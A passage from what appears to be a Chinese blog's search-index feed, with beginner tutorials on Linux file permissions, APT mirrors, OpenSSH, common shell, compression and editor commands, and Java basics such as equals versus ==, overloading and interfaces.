17:20</th><th>.profile</th></tr></thead><tbody><tr><td>文档类型及权限</td><td>连接数</td><td>文档所属用户</td><td>文档所属组</td><td>文档大小</td><td>文档最后被修改日期</td><td>文档名称</td></tr></tbody></table></li></ul><table><thead><tr><th>-</th><th>rw-</th><th>r--</th><th>r--</th></tr></thead><tbody><tr><td>文档类型</td><td>文档所有者权限（user）</td><td>文档所属用户组权限（group）</td><td>其他用户权限（other）</td></tr></tbody></table><h3 id="文档类型"><a href="#文档类型" class="headerlink" title="文档类型"></a>文档类型</h3><ul><li><code>d</code> 表示目录</li><li><code>l</code> 表示软连接</li><li><code>–</code> 表示文件</li><li><code>c</code> 表示串行端口字符设备文件</li><li><code>b</code>  表示可供存储的块设备文件<br>余下的字符 3 个字符为一组。<code>r</code>只读，<code>w</code> 可写，<code>x</code> 可执行，<code>-</code> 表示无此权限</li></ul><h3 id="连接数"><a href="#连接数" class="headerlink" title="连接数"></a>连接数</h3><p>指有多少个文件指向同一个索引节点。</p><h3 id="文档所属用户和所属组"><a href="#文档所属用户和所属组" class="headerlink" title="文档所属用户和所属组"></a>文档所属用户和所属组</h3><p>就是文档属于哪个用户和用户组。文件所属用户和组是可以更改的</p><h3 id="文档大小"><a href="#文档大小" class="headerlink" title="文档大小"></a>文档大小</h3><p>默认是 bytes</p><h1 id="更改操作权限"><a href="#更改操作权限" class="headerlink" title="更改操作权限"></a>更改操作权限</h1><h3 id="chown"><a href="#chown" class="headerlink" title="chown"></a>chown</h3><p>是 change owner 的意思，主要作用就是改变文件或者目录所有者，所有者包含用户和用户组</p><p><code>chown [-R] 用户名称 文件或者目录</code></p><p><code>chown [-R] 用户名称 用户组名称 文件或目录</code>  </p><p>-R：进行递归式的权限更改，将目录下的所有文件、子目录更新为指定用户组权限</p><h3 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h3><p>改变访问权限</p><p><code>chmod [who] [+ | - | =] [mode] 文件名</code></p><h3 id="who"><a href="#who" class="headerlink" title="who"></a>who</h3><p>表示操作对象可以是以下字母的一个或者组合</p><ul><li>u：用户 user</li><li>g：用户组 group</li><li>o：表示其他用户</li><li>a：表示所有用户是系统默认的<h3 id="操作符号"><a href="#操作符号" class="headerlink" title="操作符号"></a>操作符号</h3></li><li>+：表示添加某个权限</li><li>-：表示取消某个权限</li><li>=：赋予给定的权限，取消文档以前的所有权限<h3 id="mode"><a href="#mode" class="headerlink" title="mode"></a>mode</h3>表示可执行的权限，可以是 r、w、x</li></ul><h3 id="文件名"><a href="#文件名" class="headerlink" title="文件名"></a>文件名</h3><p>文件名可以使空格分开的文件列表</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><pre><code>lusifer@UbuntuBase:~$ ls -al test.txt -rw-rw-r-- 1 lusifer lusifer 6 Nov  2 21:47 test.txtlusifer@UbuntuBase:~$ chmod u=rwx,g+r,o+r test.txt lusifer@UbuntuBase:~$ ls -al test.txt -rwxrw-r-- 1 lusifer lusifer 6 Nov  2 21:47 test.txtlusifer@UbuntuBase:~$</code></pre><h3 id="数字设定法"><a href="#数字设定法" class="headerlink" title="数字设定法"></a>数字设定法</h3><p>数字设定法中数字表示的含义</p><ul><li>0 表示没有任何权限</li><li>1 表示有可执行权限 = x</li><li>2 表示有可写权限 = w</li><li>4 表示有可读权限 = r<br>也可以用数字来表示权限如 chmod 755 file_name</li></ul><table><thead><tr><th>r w x</th><th>r – x</th><th>r - x</th></tr></thead><tbody><tr><td>4 2 1</td><td>4 - 1</td><td>4 - 1</td></tr><tr><td>user</td><td>group</td><td>others</td></tr></tbody></table><p>若要 rwx 属性则 4+2+1=7</p><p>若要 rw- 属性则 4+2=6</p><p>若要 r-x 属性则 4+1=5</p><pre><code>lusifer@UbuntuBase:~$ chmod 777 test.txt lusifer@UbuntuBase:~$ ls -al test.txt -rwxrwxrwx 1 lusifer lusifer 6 Nov  2 21:47 test.txtlusifer@UbuntuBase:~$ chmod 770 test.txt lusifer@UbuntuBase:~$ ls -al test.txt -rwxrwx--- 1 lusifer lusifer 6 Nov  2 21:47 test.txt</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux软件包管理</title>
      <link href="2018/08/05/linux-ruan-jian-bao-guan-li/"/>
      <url>2018/08/05/linux-ruan-jian-bao-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-软件包管理"><a href="#Linux-软件包管理" class="headerlink" title="Linux 软件包管理"></a>Linux 软件包管理</h1><p>APT(Advanced Packaging Tool) 是 Debian/Ubuntu 类 Linux 系统中的软件包管理程序, 使用它可以找到想要的软件包, 而且安装、卸载、更新都很简便；也可以用来对 Ubuntu 进行升级; APT 的源文件为 <code>/etc/apt/</code> 目录下的<code>sources.list</code>文件。</p><h1 id="修改数据源"><a href="#修改数据源" class="headerlink" title="修改数据源"></a>修改数据源</h1><p>由于国内的网络环境问题，我们需要将 Ubuntu 的数据源修改为国内数据源，操作步骤如下：</p><h3 id="查看系统版本"><a href="#查看系统版本" class="headerlink" title="查看系统版本"></a>查看系统版本</h3><pre><code>lsb_release -a</code></pre><p>输出结果为</p><pre><code>No LSB modules are available.Distributor ID:    UbuntuDescription:    Ubuntu 16.04 LTSRelease:    16.04Codename:    xenial</code></pre><p>注意： Codename 为 <code>xenial</code>，该名称为我们 Ubuntu 系统的名称，修改数据源需要用到该名称</p><h3 id="编辑数据源"><a href="#编辑数据源" class="headerlink" title="编辑数据源"></a>编辑数据源</h3><pre><code>vi /etc/apt/sources.list</code></pre><p>删除全部内容并修改为</p><pre><code>deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse</code></pre><h3 id="更新数据源"><a href="#更新数据源" class="headerlink" title="更新数据源"></a>更新数据源</h3><pre><code>apt-get update</code></pre><h3 id="常用-APT-命令"><a href="#常用-APT-命令" class="headerlink" title="常用 APT 命令"></a>常用 APT 命令</h3><p>安装软件包</p><pre><code>apt-get install packagename</code></pre><p>删除软件包</p><pre><code>apt-get remove packagename</code></pre><p>更新软件包列表</p><pre><code>apt-get update</code></pre><p>升级有可用更新的系统（慎用）</p><pre><code>apt-get upgrade</code></pre><h1 id="其它-APT-命令"><a href="#其它-APT-命令" class="headerlink" title="其它 APT 命令"></a>其它 APT 命令</h1><p>搜索</p><pre><code>apt-cache search package</code></pre><p>获取包信息</p><pre><code>apt-cache show package</code></pre><p>删除包及配置文件</p><pre><code>apt-get remove package --purge</code></pre><p>了解使用依赖</p><pre><code>apt-cache depends package</code></pre><p>查看被哪些包依赖</p><pre><code>apt-cache rdepends package</code></pre><p>安装相关的编译环境</p><pre><code>apt-get build-dep package</code></pre><p>下载源代码</p><pre><code>apt-get source package</code></pre><p>清理无用的包</p><pre><code>apt-get clean &amp;&amp; apt-get autoclean</code></pre><p>检查是否有损坏的依赖</p><pre><code>apt-get check</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Xshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详细的Linux基本操作</title>
      <link href="2018/08/02/linux-yuan-cheng-kong-zhi-guan-li/"/>
      <url>2018/08/02/linux-yuan-cheng-kong-zhi-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-远程控制管理"><a href="#Linux-远程控制管理" class="headerlink" title="Linux 远程控制管理"></a>Linux 远程控制管理</h1><p>传统的网络服务程序，FTP、POP、telnet 本质上都是不安全的，因为它们在网络上通过明文传送口令和数据，这些数据非常容易被截获。SSH 叫做 <code>Secure Shell</code>。通过 SSH，可以把传输数据进行加密，预防攻击，传输的数据进行了压缩，可以加快传输速度。</p><h1 id="OpenSSH"><a href="#OpenSSH" class="headerlink" title="OpenSSH"></a>OpenSSH</h1><p>SSH 是芬兰一家公司开发。但是受到版权和加密算法限制，现在很多人都使用 OpenSSH。OpenSSH 是 SSH 的替代软件，免费。</p><p>OpenSSH 由客户端和服务端组成。</p><ul><li>基于口令的安全验证：知道服务器的帐号密码即可远程登录，口令和数据在传输过程中都会被加密。</li><li>基于密钥的安全验证：此时需要在创建一对密钥，把公有密钥放到远程服务器上自己的宿主目录中，而私有密钥则由自己保存。</li><li><h3 id="检查软件是否安装"><a href="#检查软件是否安装" class="headerlink" title="检查软件是否安装"></a>检查软件是否安装</h3><pre><code>apt-cache policy openssh-client openssh-server</code></pre></li></ul><h3 id="安装服务端"><a href="#安装服务端" class="headerlink" title="安装服务端"></a>安装服务端</h3><p><code>apt-get install openssh-server</code></p><h3 id="安装客户端"><a href="#安装客户端" class="headerlink" title="安装客户端"></a>安装客户端</h3><p><code>apt-get install openssh-client</code></p><p>OpenSSH 服务器的主要配置文件为 <code>/etc/ssh/sshd\_config</code>，几乎所有的配置信息都在此文件中。</p><h1 id="XShell"><a href="#XShell" class="headerlink" title="XShell"></a>XShell</h1><p>XShell 是一个强大的安全终端模拟软件，它支持 SSH1, SSH2, 以及 Microsoft Windows 平台的 TELNET 协议。XShell 通过互联网到远程主机的安全连接以及它创新性的设计和特色帮助用户在复杂的网络环境中享受他们的工作。<br><a href="http://www.onlinedown.net/soft/36383.htm" target="_blank" rel="noopener">下载Xshell</a><br>XShell 可以在 Windows 界面下用来访问远端不同系统下的服务器，从而比较好的达到远程控制终端的目的。</p><p>效果图如下：<img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/A104A5BEC09149258E491DE359AAECAD/1840" alt></p><h1 id="Linux-的目录结构"><a href="#Linux-的目录结构" class="headerlink" title="Linux 的目录结构"></a>Linux 的目录结构</h1><p><img src="https://note.youdao.com/yws/public/resource/4446b015d9dc2fb92d362fab8b947642/xmlnote/A40B4D2E3640437485CA4BA0C0F7FCF3/1846" alt></p><table><thead><tr><th>目录</th><th>说明</th></tr></thead><tbody><tr><td>bin</td><td>存放二进制可执行文件(ls,cat,mkdir等)</td></tr><tr><td>boot</td><td>存放用于系统引导时使用的各种文件</td></tr><tr><td>dev</td><td>用于存放设备文件</td></tr><tr><td>etc</td><td>存放系统配置文件</td></tr><tr><td>home</td><td>存放所有用户文件的根目录</td></tr><tr><td>lib</td><td>存放跟文件系统中的程序运行所需要的共享库及内核模块</td></tr><tr><td>mnt</td><td>系统管理员安装临时文件系统的安装点</td></tr><tr><td>opt</td><td>额外安装的可选应用程序包所放置的位置</td></tr><tr><td>proc</td><td>虚拟文件系统，存放当前内存的映射</td></tr><tr><td>root</td><td>超级用户目录</td></tr><tr><td>sbin</td><td>存放二进制可执行文件，只有root才能访问</td></tr><tr><td>tmp</td><td>用于存放各种临时文件</td></tr><tr><td>usr</td><td>用于存放系统应用程序，比较重要的目录/usr/local 本地管理员软件安装目录</td></tr><tr><td>var</td><td>用于存放运行时需要改变数据的文件</td></tr></tbody></table><h1 id="Linux-操作文件目录"><a href="#Linux-操作文件目录" class="headerlink" title="Linux 操作文件目录"></a>Linux 操作文件目录</h1><table><thead><tr><th>命令</th><th>说明</th><th>语法</th><th>参数</th><th>参数说明</th></tr></thead><tbody><tr><td>ls</td><td>显示文件和目录列表</td><td>ls [-alrtAFR] [name...]</td><td></td><td></td></tr><tr><td>-l</td><td>列出文件的详细信息</td><td></td><td></td><td></td></tr><tr><td>-a</td><td>列出当前目录所有文件，包含隐藏文件</td><td></td><td></td><td></td></tr><tr><td>mkdir</td><td>创建目录</td><td>mkdir [-p] dirName</td><td></td><td></td></tr><tr><td>-p</td><td>父目录不存在情况下先生成父目录</td><td></td><td></td><td></td></tr><tr><td>cd</td><td>切换目录</td><td>cd [dirName]</td><td></td><td></td></tr><tr><td>touch</td><td>生成一个空文件</td><td></td><td></td><td></td></tr><tr><td>echo</td><td>生成一个带内容文件</td><td>echo abcd &gt; 1.txt，echo 1234 &gt;&gt; 1.txt</td><td></td><td></td></tr><tr><td>cat</td><td>显示文本文件内容</td><td>cat [-AbeEnstTuv] [--help] [--version] fileName</td><td></td><td></td></tr><tr><td>cp</td><td>复制文件或目录</td><td>cp [options] source dest</td><td></td><td></td></tr><tr><td>rm</td><td>删除文件</td><td>rm [options] name...</td><td></td><td></td></tr><tr><td>-f</td><td>强制删除文件或目录</td><td></td><td></td><td></td></tr><tr><td>-r</td><td>同时删除该目录下的所有文件</td><td></td><td></td><td></td></tr><tr><td>mv</td><td>移动文件或目录</td><td>mv [options] source dest</td><td></td><td></td></tr><tr><td>find</td><td>在文件系统中查找指定的文件</td><td></td><td>-name</td><td>文件名</td></tr><tr><td>grep</td><td>在指定的文本文件中查找指定的字符串</td><td></td><td></td><td></td></tr><tr><td>tree</td><td>用于以树状图列出目录的内容</td><td></td><td></td><td></td></tr><tr><td>pwd</td><td>显示当前工作目录</td><td></td><td></td><td></td></tr><tr><td>ln</td><td>建立软链接</td><td></td><td></td><td></td></tr><tr><td>more</td><td>分页显示文本文件内容</td><td></td><td></td><td></td></tr><tr><td>head</td><td>显示文件开头内容</td><td></td><td></td><td></td></tr><tr><td>tail</td><td>显示文件结尾内容</td><td></td><td>-f</td><td>跟踪输出</td></tr></tbody></table><h1 id="Linux-操作文件目录-1"><a href="#Linux-操作文件目录-1" class="headerlink" title="Linux 操作文件目录"></a>Linux 操作文件目录</h1><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>stat</td><td>显示指定文件的相关信息,比ls命令显示内容更多</td></tr><tr><td>who</td><td>显示在线登录用户</td></tr><tr><td>hostname</td><td>显示主机名称</td></tr><tr><td>uname</td><td>显示系统信息</td></tr><tr><td>top</td><td>显示当前系统中耗费资源最多的进程</td></tr><tr><td>ps</td><td>显示瞬间的进程状态</td></tr><tr><td>du</td><td>显示指定的文件（目录）已使用的磁盘空间的总量</td></tr><tr><td>df</td><td>显示文件系统磁盘空间的使用情况</td></tr><tr><td>free</td><td>显示当前内存和交换空间的使用情况</td></tr><tr><td>ifconfig</td><td>显示网络接口信息</td></tr><tr><td>ping</td><td>测试网络的连通性</td></tr><tr><td>netstat</td><td>显示网络状态信息</td></tr><tr><td>clear</td><td>清屏</td></tr><tr><td>kill</td><td>杀死一个进程</td></tr></tbody></table><h1 id="Linux-开关机命令"><a href="#Linux-开关机命令" class="headerlink" title="Linux 开关机命令"></a>Linux 开关机命令</h1><p>shutdown 命令可以用来进行关机程序，并且在关机以前传送讯息给所有使用者正在执行的程序，shutdown 也可以用来重开机。</p><p>| 命令          | 语法  参数说明 |<br>|————-|———————————————————|—-|——|<br>| shutdown    | shutdown [-t seconds] [-rkhncfF] time [message] |<br>| -t seconds | 设定在几秒钟之后进行关机程序                                          |<br>| -k         | 并不会真的关机，只是将警告讯息传送给所有只用者                                 |<br>| -r         | 关机后重新开机（重启）                                             |<br>| -h         | 关机后停机                                                   |<br>| -n         | 不采用正常程序来关机，用强迫的方式杀掉所有执行中的程序后自行关机                        |<br>| -c         | 取消目前已经进行中的关机动作                                          |<br>| -f         | 关机时，不做 fcsk 动作(检查 Linux 档系统)                          |<br>| -F         | 关机时，强迫进行 fsck 动作                                        |<br>| time        | 设定关机的时间                                                 |<br>| message     | 传送给所有使用者的警告讯息                                           |</p><h1 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h1><ul><li>reboot</li><li>shutdown -r now<h1 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h1></li><li>shutdown -h now</li></ul><h1 id="Linux-压缩命令"><a href="#Linux-压缩命令" class="headerlink" title="Linux 压缩命令"></a>Linux 压缩命令</h1><h1 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h1><table><thead><tr><th>命令</th><th>语法</th><th>参数</th><th>参数说明</th></tr></thead><tbody><tr><td></td><td></td><td>tar</td><td>tar [-cxzjvf] 压缩打包文档的名称 欲打包目录</td></tr><tr><td></td><td></td><td>-c</td><td>建立一个归档文件的参数指令</td></tr><tr><td></td><td></td><td>-x</td><td>解开一个归档文件的参数指令</td></tr><tr><td></td><td></td><td>-z</td><td>是否需要用 gzip 压缩</td></tr><tr><td></td><td></td><td>-j</td><td>是否需要用 bzip2 压缩</td></tr><tr><td></td><td></td><td>-v</td><td>压缩的过程中显示文件</td></tr><tr><td></td><td></td><td>-f</td><td>使用档名，在 f 之后要立即接档名</td></tr><tr><td></td><td></td><td>-tf</td><td>查看归档文件里面的文件</td></tr><tr><td><strong>例子</strong>：</td><td></td><td></td><td></td></tr></tbody></table><ul><li>压缩文件夹：<code>tar -zcvf test.tar.gz test\</code></li><li>解压文件夹：<code>tar -zxvf test.tar.gz</code><h1 id="gzip"><a href="#gzip" class="headerlink" title="gzip"></a>gzip</h1></li></ul><table><thead><tr><th>命令</th><th>语法</th><th>参数</th><th>参数说明</th></tr></thead><tbody><tr><td></td><td></td><td>gzip</td><td>gzip [选项] 压缩（解压缩）的文件名</td></tr><tr><td></td><td></td><td>-d</td><td>解压缩</td></tr><tr><td></td><td></td><td>-l</td><td>对每个压缩文件，显示压缩文件的大小，未压缩文件的大小，压缩比，未压缩文件的名字</td></tr><tr><td></td><td></td><td>-v</td><td>对每一个压缩和解压的文件，显示文件名和压缩比</td></tr><tr><td></td><td></td><td>-num</td><td>用指定的数字num调整压缩的速度，-1或--fast表示最快压缩方法（低压缩比），-9或--best表示最慢压缩方法（高压缩比）。系统缺省值为6</td></tr></tbody></table><p>说明：压缩文件后缀为 gz</p><h1 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2"></a>bzip2</h1><table><thead><tr><th>命令</th><th>语法</th><th>参数</th><th>参数说明</th></tr></thead><tbody><tr><td>bzip2</td><td>bzip2 [-cdz]</td><td></td><td></td></tr><tr><td></td><td></td><td>-d</td><td>解压缩</td></tr><tr><td></td><td></td><td>-z</td><td>压缩参数</td></tr><tr><td></td><td></td><td>-num</td><td>用指定的数字num调整压缩的速度，-1或--fast表示最快压缩方法（低压缩比），-9或--best表示最慢压缩方法（高压缩比）。系统缺省值为6</td></tr></tbody></table><p>说明：压缩文件后缀为 bz2</p><h1 id="Linux-编辑器"><a href="#Linux-编辑器" class="headerlink" title="Linux 编辑器"></a>Linux 编辑器</h1><p>vim</p><p>#运行模式<br>编辑模式：等待编辑命令输入</p><p>插入模式：编辑模式下，输入 <code>i</code> 进入插入模式，插入文本信息</p><p>命令模式：在编辑模式下，输入<code>:</code> 进行命令模式</p><p>#命令<br><code>:q</code>直接退出vi</p><p><code>:wq</code>保存后退出vi ，并可以新建文件</p><p><code>:q!</code> 强制退出</p><p><code>:w file</code> 将当前内容保存成某个文件</p><p><code>:set number</code> 在编辑文件显示行号</p><p><code>:set nonumber</code> 在编辑文件不显示行号</p><h1 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h1><p>nano 是一个字符终端的文本编辑器，有点像 DOS 下的 editor 程序。它比 vi/vim 要简单得多，比较适合 Linux 初学者使用。某些 Linux 发行版的默认编辑器就是 nano。</p><h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><ul><li>保存：ctrl + o</li><li>搜索：ctrl + w</li><li>上一页：ctrl + y</li><li>下一页：ctrl + v</li><li>退出：ctrl + x</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Xshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux简介</title>
      <link href="2018/08/01/linux-jian-jie/"/>
      <url>2018/08/01/linux-jian-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>Linux 是一种自由和开放源码的类 UNIX 操作系统，使用 <code>Linux 内核</code>。目前存在着许多不同的 Linux 发行版，可安装在各种各样的电脑硬件设备，从手机、平板电脑、路由器和影音游戏控制台，到桌上型电脑，大型电脑和超级电脑。 <code>Linux</code> 是一个领先的操作系统，世界上运算最快的 10 台超级电脑运行的都是 <code>Linux</code> 操作系统</p><p>Linux 操作系统也是自由软件和开放源代码发展中最著名的例子。只要遵循 GNU 通用公共许可证,任何人和机构都可以自由地使用 Linux 的所有底层源代码，也可以自由地修改和再发布。严格来讲，Linux 这个词本身只表示 Linux 内核，但在实际上人们已经习惯了用 Linux 来形容整个基于 Linux 内核，并且使用 GNU 工程各种工具和数据库的操作系统 (也被称为 GNU/ Linux)。通常情况下，Linux 被打包成供桌上型电脑和服务器使用的 Linux 发行版本。一些流行的主流 Linux 发行版本，包括 Debian (及其衍生版本 Ubuntu)，Fedora 和 OpenSUSE 等。Kernel + Softwares + Tools 就是 Linux Distribution</p><p>目前市面上较知名的发行版有：<code>Ubuntu</code>、RedHat、<code>CentOS</code>、Debian、Fedora、SuSE、OpenSUSE、TurboLinux、BluePoint、RedFlag、Xterm、SlackWare等。</p><h1 id="Linux-与-Windows-比较"><a href="#Linux-与-Windows-比较" class="headerlink" title="Linux 与 Windows 比较"></a>Linux 与 Windows 比较</h1><p>目前国内 Linux 更多的是应用于服务器上，而桌面操作系统更多使用的是 Windows。主要区别如下:</p><table><thead><tr><th>比较</th><th>Windows</th><th>Linux</th></tr></thead><tbody><tr><td>界面</td><td>界面统一，外壳程序固定所有 Windows 程序菜单几乎一致，快捷键也几乎相同</td><td>图形界面风格依发布版不同而不同，可能互不兼容。GNU/Linux 的终端机是从 UNIX 传承下来，基本命令和操作方法也几乎一致。</td></tr><tr><td>驱动程序</td><td>驱动程序丰富，版本更新频繁。默认安装程序里面一般包含有该版本发布时流行的硬件驱动程序，之后所出的新硬件驱动依赖于硬件厂商提供。对于一些老硬件，如果没有了原配的驱动有时很难支持。另外，有时硬件厂商未提供所需版本的 Windows 下的驱动，也会比较头痛。</td><td>由志愿者开发，由Linux核心开发小组发布，很多硬件厂商基于版权考虑并未提供驱动程序，尽管多数无需手动安装，但是涉及安装则相对复杂，使得新用户面对驱动程序问题（是否存在和安装方法）会一筹莫展。但是在开源开发模式下，许多老硬件尽管在 Windows 下很难支持的也容易找到驱动。HP、Intel、AMD 等硬件厂商逐步不同程度支持开源驱动，问题正在得到缓解。</td></tr><tr><td>使用</td><td>使用比较简单，容易入门。图形化界面对没有计算机背景知识的用户使用十分有利。</td><td>图形界面使用简单，容易入门。文字界面，需要学习才能掌握。</td></tr><tr><td>学习</td><td>系统构造复杂、变化频繁，且知识、技能淘汰快，深入学习困难。</td><td>系统构造简单、稳定，且知识、技能传承性好，深入学习相对容易。</td></tr><tr><td>软件</td><td>每一种特定功能可能都需要商业软件的支持，需要购买相应的授权。</td><td>大部分软件都可以自由获取，同样功能的软件选择较少。</td></tr></tbody></table><h1 id="安装-Ubuntu-Server"><a href="#安装-Ubuntu-Server" class="headerlink" title="安装 Ubuntu Server"></a>安装 Ubuntu Server</h1><p><a href="https://ubuntu.com/download" target="_blank" rel="noopener">下载 Ubuntu Server</a></p><h1 id="安装-VMware"><a href="#安装-VMware" class="headerlink" title="安装 VMware"></a>安装 VMware</h1><p><a href="https://leblog.github.io/2018/03/18/vmware-workstation-pro-15-xia-zai/">安装虚拟机</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA小知识总结</title>
      <link href="2018/07/21/java-xiao-zhi-shi-zong-jie/"/>
      <url>2018/07/21/java-xiao-zhi-shi-zong-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="equals-与-的区别"><a href="#equals-与-的区别" class="headerlink" title="equals 与 == 的区别"></a>equals 与 == 的区别</h1><ul><li><code>==</code>与<code>equals</code>的主要区别是：<code>==</code> 常用于比较原生类型，而 <code>equals()</code> 方法用于检查对象的相等性。</li><li>另一个不同的点是：如果 <code>==</code>和 <code>equals()</code> 用于比较对象，当两个引用地址相同，<code>==</code> 返回 true。而 <code>equals()</code> 可以返回 true 或者 false 主要取决于重写实现。最常见的一个例子，字符串的比较，不同情况 <code>==</code> 和 <code>equals()</code> 返回不同的结果。</li></ul><h1 id="session-与-cookie-区别"><a href="#session-与-cookie-区别" class="headerlink" title="session 与 cookie 区别"></a>session 与 cookie 区别</h1><ul><li>cookie 数据存放在客户的浏览器上，session 数据放在服务器上。</li><li>cookie 不是很安全，别人可以分析存放在本地的 - cookie 并进行 cookie 欺骗，考虑到安全应当使用 session。</li><li>session 会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能，考虑到减轻服务器性能方面，应当使用 cookie。</li><li>单个 cookie 保存的数据不能超过 4K，很多浏览器都限制一个站点最多保存 20 个 cookie。    </li></ul><h1 id="final-finally-finalize-的区别"><a href="#final-finally-finalize-的区别" class="headerlink" title="final, finally, finalize 的区别"></a>final, finally, finalize 的区别</h1><h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><p>用于声明属性,方法和类, 分别表示属性不可变, 方法不可覆盖, 类不可继承.</p><h3 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h3><p>是异常处理语句结构的一部分，表示总是执行.</p><h3 id="finalize"><a href="#finalize" class="headerlink" title="finalize"></a>finalize</h3><p>是Object类的一个方法，在垃圾收集器执行的时候会调用被回收对象的此方法，可以覆盖此方法提供垃圾收集时的其他资源回收，例如关闭文件等. JVM不保证此方法总被调用.</p><h1 id="int-和-Integer-有什么区别"><a href="#int-和-Integer-有什么区别" class="headerlink" title="int 和 Integer 有什么区别"></a>int 和 Integer 有什么区别</h1><p>int 是 Java 提供的 8 种原始数据类型之一。Java 为每个原始类型提供了封装类，Integer 是 Java 为 int 提供的封装类。 int 的默认值为 <code>0</code>，而 Integer 的默认值为 <code>null</code>，是引用类型，即 Integer 可以区分出未赋值和值为 0 的区别，int 则无法表达出未赋值的情况， Java 中 int 和 Integer 关系是比较微妙的。关系如下：</p><ul><li>int 是基本的数据类型；</li><li>Integer 是 int 的封装类；</li><li>int 和 Integer 都可以表示某一个数值；</li><li>int 和 Integer 不能够互用，因为他们两种不同的数据类型；</li></ul><h1 id="重载和重写的区别"><a href="#重载和重写的区别" class="headerlink" title="重载和重写的区别"></a>重载和重写的区别</h1><h3 id="重载-Overload"><a href="#重载-Overload" class="headerlink" title="重载 Overload"></a>重载 Overload</h3><p>表示同一个类中可以有多个名称相同的方法，但这些方法的参数列表各不相同（即参数个数或类型不同）。</p><h3 id="重写-Override"><a href="#重写-Override" class="headerlink" title="重写 Override"></a>重写 Override</h3><p>表示子类中的方法可以与父类中的某个方法的名称和参数完全相同，通过子类创建的实例对象调用这个方法时，将调用子类中的定义方法，这相当于把父类中定义的那个完全相同的方法给覆盖了，这也是面向对象编程的多态性的一种表现。子类覆盖父类的方法时，只能比父类抛出更少的异常，或者是抛出父类抛出的异常的子异常，因为子类可以解决父类的一些问题，不能比父类有更多的问题。子类方法的访问权限只能比父类的更大，不能更小。如果父类的方法是private类型，那么，子类则不存在覆盖的限制，相当于子类中增加了一个全新的方法。</p><h1 id="抽象类和接口有什么区别"><a href="#抽象类和接口有什么区别" class="headerlink" title="抽象类和接口有什么区别"></a>抽象类和接口有什么区别</h1><table><thead><tr><th>参数</th><th>抽象类</th><th>接口</th></tr></thead><tbody><tr><td>默认的方法实现</td><td>它可以有默认的方法实现</td><td>接口完全是抽象的。它根本不存在方法的实现</td></tr><tr><td>实现</td><td>子类使用 extends 关键字来继承抽象类。如果子类不是抽象类的话，它需要提供抽象类中所有声明的方法的实现。</td><td>子类使用关键字 implements 来实现接口。它需要提供接口中所有声明的方法的实现</td></tr><tr><td>构造器</td><td>抽象类可以有构造器</td><td>接口不能有构造器</td></tr><tr><td>与正常 Java 类的区别</td><td>除了你不能实例化抽象类之外，它和普通Java类没有任何区别</td><td>接口是完全不同的类型</td></tr><tr><td>访问修饰符</td><td>抽象方法可以有 public、protected 和 default 这些修饰符</td><td>接口方法默认修饰符是 public。你不可以使用其它修饰符。</td></tr><tr><td>main 方法</td><td>抽象方法可以有 main 方法并且我们可以运行它</td><td>接口没有 main 方法，因此我们不能运行它。</td></tr><tr><td>多继承</td><td>抽象方法可以继承一个类和实现多个接口</td><td>接口只可以继承一个或多个其它接口</td></tr><tr><td>速度</td><td>它比接口速度要快</td><td>接口是稍微有点慢的，因为它需要时间去寻找在类中实现的方法。</td></tr><tr><td>添加新方法</td><td>如果你往抽象类中添加新的方法，你可以给它提供默认的实现。因此你不需要改变你现在的代码。</td><td>如果你往接口中添加方法，那么你必须改变实现该接口的类。</td></tr></tbody></table><h1 id="面向对象的特征"><a href="#面向对象的特征" class="headerlink" title="面向对象的特征"></a>面向对象的特征</h1><p>面向对象的三个基本特征是：<code>封装</code>、<code>继承</code>、<code>多态</code>。</p><h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>封装最好理解了。封装是面向对象的特征之一，是对象和类概念的主要特性。 封装，也就是把客观事物封装成抽象的类，并且类可以把自己的数据和方法只让可信的类或者对象操作，对不可信的进行信息隐藏。</p><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>面向对象编程 (OOP) 语言的一个主要功能就是“继承”。继承是指这样一种能力：它可以使用现有类的所有功能，并在无需重新编写原来的类的情况下对这些功能进行扩展。</p><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>多态性（polymorphisn）是允许你将父对象设置成为和一个或更多的他的子对象相等的技术，赋值之后，父对象就可以根据当前赋值给它的子对象的特性以不同的方式运作。简单的说，就是一句话：允许将子类类型的指针赋值给父类类型的指针。 